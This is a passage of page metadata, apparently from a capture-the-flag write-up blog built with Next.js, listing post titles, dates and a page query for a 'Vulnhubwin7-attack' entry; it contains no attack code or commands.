Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"02","id":"Vulnhubwin7-attack"},"buildId":"AQ7er0iu8khUr2lT-18RD","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>